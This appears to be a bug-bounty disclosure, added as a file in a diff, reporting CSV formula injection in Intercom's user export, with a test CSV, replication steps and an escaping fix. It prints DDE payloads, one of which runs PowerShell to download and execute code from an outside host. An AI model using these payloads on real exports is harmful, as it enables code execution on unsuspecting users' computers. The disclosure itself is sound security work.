@@ -1,0 +1,45 @@
+# CSV Injection
+
+# What is the Vulnerability?
+
+The ability to inject a CSV payload into CSV exports. Tested with the following payload as an imported csv:
+
+```
+id, email, name
+=1+1, equals@email.com, equals
+-1+1, minus@email.com, minus
+@sum(a1), at@email.com, at-symbol
++1+1, plus@email.com, plus
+```
+
+# What is the Security Impact?
+
+As can be seen by the attached export, row 3 - 5 are improperly escaped, leading to the ability for a user to arbitrarily injection payloads into any intercom's customers and potentially achieve compromise of your customer's computers when a data export occurs.
+
+Some examples of "malicious" payloads are as follows:
+
+```
+@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0
+@2+3+cmd|' /C calc'!A0
+```
+
+The above exploits can be weaponized via powershell or malicious hyperlinks as outlined in numerous blog posts:
+
+* https://blog.zsec.uk/csv-dangers-mitigations/
+* https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
+* https://www.we45.com/2017/02/14/csv-injection-theres-devil-in-the-detail/
+
+The impact of this bug ought to be more severe than BugCrowd's assessed P5 Vulnerability Rating for the reason that intercom's customers are easy to discover (https://wappalyzer.com/applications/intercom) and this issue exploits the trust relationship that intercom has with its customers. Namely that an export from intercom is safe. This would have a greater impact upon intercom's customers, reputation, and public image were it to be exploited than your average CSV attack.
+
+# Replication Steps:
+
+1. Import the attached PoC csv file
+  * It should be noted that this is the easiest way to achieve PoC and would not be the main exploit entry point.
+2. Map the columns to the correct column types
+3. Upon import completion, select the 4 imported users
+4. Choose 'More -> Export'
+5. Download CSV & Open in excel
+
+# Fixing
+
+You need to escape the following character: plus `+`, minus `-`, and at `@` in addition to the already escaped equals `=` by prepending a single quote `'` to these characters when they appear at the start of a field (remember to trim leading whitespace!) Additionally pipe `|` could also be escaped for extra safety as this is needed to execute the binary itself.
